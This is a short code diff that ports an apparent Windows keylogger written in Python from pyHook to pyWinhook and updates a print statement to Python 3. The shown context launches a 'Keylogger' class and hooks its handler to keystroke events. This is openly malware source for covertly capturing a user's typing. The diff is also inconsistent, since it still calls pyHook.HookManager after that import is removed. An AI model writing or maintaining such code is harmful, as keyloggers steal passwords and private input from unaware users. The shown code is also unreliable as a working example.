@@ -1,5 +1,5 @@
 import os
-import pyHook
+import pyWinhook
 import threading
 import win32api
 import win32gui
@@ -53,7 +53,7 @@ class Keylogger:
 
 
 def hookslaunch():
-    print '[*] Starting keylogger'
+    print ('[*] Starting keylogger')
     a = Keylogger()
     hooks_manager = pyHook.HookManager()
     hooks_manager.KeyDown = a.OnKeyboardEvent
